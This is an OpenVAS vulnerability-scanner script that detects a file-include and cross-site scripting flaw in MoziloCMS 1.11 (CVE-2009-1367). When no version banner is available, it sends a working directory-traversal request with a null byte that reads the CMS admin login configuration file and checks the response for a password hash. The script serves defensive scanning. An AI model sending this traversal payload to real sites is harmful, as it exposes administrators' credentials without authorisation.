###############################################################################
# OpenVAS Vulnerability Test
# $Id: mozilloCMS_34474.nasl 9425 2018-04-10 12:38:38Z cfischer $
#
# MoziloCMS Local File Include and Cross Site Scripting
# Vulnerabilities
#
# Authors
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "MoziloCMS is prone to a local file-include vulnerability and a
  cross-site scripting vulnerability because it fails to properly
  sanitize user-supplied input.

  An attacker can exploit the local file-include vulnerability using
  directory-traversal strings to view and execute local files within
  the context of the webserver process.

  The attacker may leverage the cross-site scripting issue to execute
  arbitrary script code in the browser of an unsuspecting user in the
  context of the affected site. This may let the attacker steal
  cookie-based authentication credentials and launch other attacks.

  MoziloCMS 1.11 is vulnerable; other versions may also be affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100124");
 script_version("$Revision: 9425 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-10 14:38:38 +0200 (Tue, 10 Apr 2018) $");
 script_tag(name:"creation_date", value:"2009-04-12 20:09:50 +0200 (Sun, 12 Apr 2009)");
 script_tag(name:"cvss_base", value:"4.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_cve_id("CVE-2009-1367");
 script_bugtraq_id(34474);

 script_name("MoziloCMS Local File Include and Cross Site Scripting Vulnerabilities");


 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_banner");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("mozilloCMS_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34474");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!version = get_kb_item(string("www/", port, "/moziloCMS")))exit(0);
if(!matches = eregmatch(string:version, pattern:"^(.+) under (/.*)$"))exit(0);

vers = matches[1];
dir  = matches[2];

if(!isnull(vers) && vers >!< "unknown") {

  if(version_is_equal(version: vers, test_version: "1.11")) {
    VULN = TRUE;
  }  

} else {  
# No version found, try to exploit.
  if(!isnull(dir)) {
     url = string(dir, "/index.php?cat=10_Willkommen&page=../../admin/conf/logindata.conf%00");
     req = http_get(item:url, port:port);
     buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
     if( buf == NULL )continue;
     if(egrep(pattern:"pw = [a-f0-9]{32}", string: buf))
       {    
  	  VULN = TRUE;
       }
  }
}

if(VULN) {

  security_message(port:port);
  exit(0);

}  
exit(0);
